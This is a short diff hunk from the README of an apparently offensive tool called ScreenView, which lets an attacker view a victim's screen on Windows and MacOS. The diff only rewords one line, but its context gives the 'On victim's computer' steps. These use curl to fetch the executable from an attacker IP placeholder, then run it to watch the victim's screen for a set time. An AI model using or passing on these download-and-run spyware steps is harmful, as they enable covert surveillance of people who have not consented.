@@ -23,7 +23,7 @@ This module can run on Windows and MacOS. To configure the payload go to line 40
 ### On victim's computer
 ```
 $ curl http://IP/ScreenView/ScreenView.(exe, app, ect)
-$ ScreenView.(exe, app, ect) --time (time in minutes to see the victim's screen)
+$ ScreenView.(exe, app, ect) --time (time in minutes to view the victim's screen)
 ```
 
 ## Compilation
